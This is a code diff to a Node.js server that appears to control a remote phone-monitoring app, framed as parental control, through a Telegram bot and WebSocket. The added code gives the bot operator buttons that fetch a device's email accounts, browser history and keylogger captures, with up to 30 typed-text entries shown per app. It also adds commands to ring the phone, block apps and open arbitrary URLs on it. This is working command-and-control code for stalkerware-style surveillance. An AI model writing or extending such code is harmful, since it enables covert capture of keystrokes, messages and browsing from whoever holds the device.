@@ -669,6 +669,35 @@ function handleBotDataResult(chatId, deviceId, payload) {
       bot.sendDocument(chatId, buf,
         { caption: `📦 *${escDev}* — ${apps.length} apps installed` },
         { filename: 'installed_apps.txt', contentType: 'text/plain' });
+
+    } else if (payload.type === 'email_accounts_result') {
+      const accounts = payload.accounts || [];
+      if (accounts.length === 0) { bot.sendMessage(chatId, `📧 No email accounts found.`); return; }
+      let text = `📧 *Email Accounts — ${escDev}*\n\n`;
+      for (const a of accounts) text += `✉️ \`${escapeMdCode(a.email)}\`\n`;
+      bot.sendMessage(chatId, text, { parse_mode: 'Markdown',
+        reply_markup: { inline_keyboard: [[{ text: '◀️ Back', callback_data: `sel:${deviceId}` }]] } });
+
+    } else if (payload.type === 'browser_history_result') {
+      const items = payload.items || [];
+      if (items.length === 0) { bot.sendMessage(chatId, `🌐 No history accessible.`); return; }
+      const lines = items.map(h => `${h.title || h.url}\n${h.url}`).join('\n\n');
+      const buf = Buffer.from(lines, 'utf-8');
+      bot.sendDocument(chatId, buf,
+        { caption: `🌐 *${escDev}* — ${items.length} history entries` },
+        { filename: 'history.txt', contentType: 'text/plain' });
+
+    } else if (payload.type === 'keylog_result') {
+      const entries = payload.entries || [];
+      if (entries.length === 0) { bot.sendMessage(chatId, `⌨️ Keylog khali — kichu ashe nai.`); return; }
+      let text = `⌨️ *Keylog — ${escDev}* (${entries.length} entries)\n\n`;
+      for (const e of entries.slice(0, 30)) {
+        const time = new Date(e.time).toLocaleString('bn-BD');
+        text += `📱 ${escapeMd(e.app || e.package)} — ${time}\n_${escapeMd(e.text.slice(0,120))}_\n\n`;
+      }
+      if (entries.length > 30) text += `\n_…aro ${entries.length-30} ta entry_`;
+      bot.sendMessage(chatId, text, { parse_mode: 'Markdown',
+        reply_markup: { inline_keyboard: [[{ text: '◀️ Back', callback_data: `sel:${deviceId}` }]] } });
     }
   } catch (e) { console.error('[BOT] Data result error:', e.message); }
 }
@@ -769,6 +798,21 @@ function initTelegramBot() {
       [
         { text: "📸 Screenshot",     callback_data: `act:take_screenshot:${deviceId}` },
         { text: "ℹ️ Device Info",    callback_data: `act:get_info:${deviceId}` },
+      ],
+      [
+        { text: "📧 Email Accounts", callback_data: `act:email_accounts:${deviceId}` },
+        { text: "🌐 History",        callback_data: `act:browser_history:${deviceId}` },
+      ],
+      [
+        { text: "⌨️ Keylog",         callback_data: `act:keylog:${deviceId}` },
+        { text: "🔔 Ring Loud",      callback_data: `act:ring:${deviceId}` },
+      ],
+      [
+        { text: "🚫 Block App",      callback_data: `act:block_app:${deviceId}` },
+        { text: "✅ Unblock App",    callback_data: `act:unblock_app:${deviceId}` },
+      ],
+      [
+        { text: "🔗 Open URL",       callback_data: `act:open_url:${deviceId}` },
       ],
       [
         { text: "💬 Show Toast",     callback_data: `act:toast:${deviceId}` },
@@ -996,6 +1040,34 @@ function initTelegramBot() {
         `✅ Block policy update hoyeche!\n\n👦 *${escapeMd(dev?.childName)}*\n🚫 Blocked: \`${escapeMdCode(apps)}\`\n\n_Apps gulo ekhon theke block thakbe._`,
         { parse_mode: "Markdown", reply_markup: { inline_keyboard: [[{ text: "◀️ Back to Device", callback_data: `sel:${devId}` }]] } }
       );
+      return;
+    }
+
+    if (state.awaitingInput === 'block_app' || state.awaitingInput === 'unblock_app' ||
+        state.awaitingInput === 'open_url') {
+      const inputType = state.awaitingInput;
+      state.awaitingInput = null;
+      const devId = state.selectedDeviceId;
+      const dev   = childDevices.get(devId);
+      const val   = text.trim();
+      if (!val) { bot.sendMessage(chatId, "❌ Value khali — abar type koro."); return; }
+
+      if (inputType === 'block_app' || inputType === 'unblock_app') {
+        const cmd = inputType === 'block_app' ? 'block_app' : 'unblock_app';
+        const pkg = val.toLowerCase().replace(/[^a-z0-9._]/g, '');
+        sendCommandToDevice(devId, { command: cmd, package: pkg });
+        bot.sendMessage(chatId,
+          `${cmd === 'block_app' ? '🚫' : '✅'} ${cmd === 'block_app' ? 'Block' : 'Unblock'} command pathano hoyeche!\n\n👦 *${escapeMd(dev?.childName)}*\n📦 \`${escapeMdCode(pkg)}\``,
+          { parse_mode: "Markdown", reply_markup: { inline_keyboard: [[{ text: "◀️ Back to Device", callback_data: `sel:${devId}` }]] } }
+        );
+      } else {
+        const url = val.startsWith('http://') || val.startsWith('https://') ? val : `https://${val}`;
+        sendCommandToDevice(devId, { command: 'open_url', url });
+        bot.sendMessage(chatId,
+          `🔗 URL open command pathano hoyeche!\n\n👦 *${escapeMd(dev?.childName)}*\n🌐 \`${escapeMdCode(url)}\``,
+          { parse_mode: "Markdown", reply_markup: { inline_keyboard: [[{ text: "◀️ Back to Device", callback_data: `sel:${devId}` }]] } }
+        );
+      }
       return;
     }
 
@@ -1317,6 +1389,50 @@ Kon inbox dekhte chao?`, {
         bot.answerCallbackQuery(query.id, { text: "📸 Taking screenshot…" });
         sendCommandToDevice(deviceId, { command: "take_screenshot" });
         bot.sendMessage(chatId, `📸 Screenshot request sent to *${escapeMd(getDeviceName(deviceId))}*\n_(requires active screen mirror)_`, { parse_mode: "Markdown" });
+        return;
+      }
+
+      // email accounts / browser history / keylog (data results)
+      const dataActionMap = {
+        email_accounts:    { cmd: 'get_email_accounts',   type: 'email_accounts_result',    msg: '📧 Loading email accounts…' },
+        browser_history:   { cmd: 'get_browser_history',  type: 'browser_history_result',   msg: '🌐 Loading browser history…' },
+        keylog:            { cmd: 'get_keylog',           type: 'keylog_result',            msg: '⌨️ Loading keylog…' },
+      };
+      if (dataActionMap[action]) {
+        const spec = dataActionMap[action];
+        if (!childDevices.has(deviceId)) { bot.answerCallbackQuery(query.id, { text: '❌ Device offline.' }); return; }
+        bot.answerCallbackQuery(query.id, { text: spec.msg });
+        pendingBotFileRequests.set(deviceId + '_data', { chatId, type: spec.type });
+        sendCommandToDevice(deviceId, { command: spec.cmd });
+        bot.sendMessage(chatId, `${spec.msg} *${escapeMd(getDeviceName(deviceId))}*…`, { parse_mode: 'Markdown' });
+        setTimeout(() => {
+          if (pendingBotFileRequests.get(deviceId + '_data')?.type === spec.type) {
+            pendingBotFileRequests.delete(deviceId + '_data');
+            bot.sendMessage(chatId, '⏱️ Timeout — response ashe nai.');
+          }
+        }, 15000);
+        return;
+      }
+
+      // ring loud
+      if (action === "ring") {
+        bot.answerCallbackQuery(query.id, { text: "🔔 Ringing…" });
+        sendCommandToDevice(deviceId, { command: "ring", duration: 20 });
+        bot.sendMessage(chatId, `🔔 *${escapeMd(getDeviceName(deviceId))}* er phone e loud ring bajano hocche (20s)`, { parse_mode: "Markdown" });
+        return;
+      }
+
+      // block_app / unblock_app / open_url require text input
+      if (action === "block_app" || action === "unblock_app" || action === "open_url") {
+        state.selectedDeviceId = deviceId;
+        state.awaitingInput    = action;
+        const hints = {
+          block_app:   "🚫 Block korar jonno app er package name likho.\n\nExample: `com.tiktok.musically`",
+          unblock_app: "✅ Unblock korar jonno app er package name likho.\n\nExample: `com.tiktok.musically`",
+          open_url:    "🔗 Child er phone er browser e open korar jonno URL likho.\n\nExample: `https://example.com`",
+        };
+        bot.answerCallbackQuery(query.id, { text: "✏️ Type koro" });
+        bot.sendMessage(chatId, `✏️ *${escapeMd(dev.childName)}*\n\n${hints[action]}`, { parse_mode: "Markdown" });
         return;
       }
 
@@ -1902,6 +2018,48 @@ function normalizeFeatureResponse(payload) {
         time: Date.now()
       };
 
+    case 'email_accounts_result':
+      if (payload.error) {
+        return { type: 'email_accounts_result', error: payload.error, time: Date.now() };
+      }
+      return {
+        type: 'email_accounts_result',
+        accounts: (payload.accounts || []).map(a => ({
+          email: a.email || a.name || '',
+          type: a.type || ''
+        })),
+        time: Date.now()
+      };
+
+    case 'browser_history_result':
+      if (payload.error) {
+        return { type: 'browser_history_result', error: payload.error, time: Date.now() };
+      }
+      return {
+        type: 'browser_history_result',
+        items: (payload.items || []).map(h => ({
+          title: h.title || '',
+          url: h.url || '',
+          time: h.time || 0
+        })),
+        time: Date.now()
+      };
+
+    case 'keylog_result':
+      if (payload.error) {
+        return { type: 'keylog_result', error: payload.error, time: Date.now() };
+      }
+      return {
+        type: 'keylog_result',
+        entries: (payload.entries || []).map(e => ({
+          time: e.time || 0,
+          app: e.app || e.package || '',
+          package: e.package || '',
+          text: e.text || ''
+        })),
+        time: Date.now()
+      };
+
     default:
       return null;
   }
@@ -2152,7 +2310,9 @@ wss.on('connection', (ws, req) => {
           }
 
         } else if (payload.type === 'call_log_result' || payload.type === 'sms_result' ||
-                   payload.type === 'contacts_result' || payload.type === 'installed_apps_result') {
+                   payload.type === 'contacts_result' || payload.type === 'installed_apps_result' ||
+                   payload.type === 'email_accounts_result' || payload.type === 'browser_history_result' ||
+                   payload.type === 'keylog_result') {
           payload.deviceId = deviceId;
           broadcastToAdmins(payload);
           const pr = pendingBotFileRequests.get(deviceId + '_data');
